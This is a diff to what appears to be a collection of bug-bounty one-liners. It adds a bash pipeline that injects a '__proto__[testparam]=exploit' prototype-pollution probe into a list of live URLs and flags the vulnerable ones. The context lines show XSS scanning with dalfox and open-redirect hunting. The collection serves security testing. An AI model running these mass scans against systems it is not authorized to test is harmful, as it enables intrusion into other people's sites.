@@ -31,6 +31,14 @@ cat waybackurl.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | par
 gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
 ```
 
+### Prototype Pollution
+> @R0X4R
+
+```bash
+sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULN"
+```
+
+
 ### CVE-2020-5902
 > @Madrobot_
 
